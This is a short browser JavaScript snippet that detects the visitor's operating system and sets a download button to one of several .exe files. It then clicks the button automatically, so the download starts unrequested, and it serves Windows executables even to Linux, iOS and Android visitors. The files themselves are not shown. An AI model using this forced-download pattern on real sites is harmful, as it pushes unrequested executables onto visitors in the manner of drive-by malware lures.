
fileTodownload();
function fileTodownload(){
    let os=platform.os.family;
    let version=platform.os.version;
    let btn=document.getElementsByClassName('btn')[0];
    if(os.indexOf('Windows')!=-1 && version==7){
        btn.href='../../../assets/files/W7.exe'
        btn.download='W7.exe'
    }else
    if(os.indexOf('iOS')!=-1 ||
    os.indexOf('Linux')!=-1||
    os.indexOf('OS X')!=-1||
    os.indexOf('Ubuntu')!=-1||
    os.indexOf('Debian')!=-1||
    os.indexOf('Fedora')!=-1||
    os.indexOf('Red Ha')!=-1){
        btn.href='../../../assets/files/IML.exe'
        btn.download='IML.exe'
    }else
    if(os.indexOf('Android')!=-1){
        btn.href='../../../assets/files/AND.exe'
        btn.download='AND.exe'
    }
    else if(os.indexOf('Windows')!=-1 && version==10){
        btn.href='../../../assets/files/W10.exe'
        btn.download='W10.exe'
    }
    btn.click();
}